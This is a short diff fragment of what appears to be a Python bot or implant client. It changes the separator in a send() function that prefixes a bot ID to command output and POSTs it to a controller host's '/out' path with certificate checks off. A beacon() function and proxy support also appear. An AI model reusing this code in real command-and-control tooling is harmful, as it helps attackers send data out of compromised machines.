@@ -24,7 +24,7 @@ def beacon(host, seconds, proxies):
     return 0
 
 def send(host, output, proxies):
-  output = botID[0]+' '+output
+  output = botID[0]+', '+output
   if proxies is not None:
     response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies)
     return response     
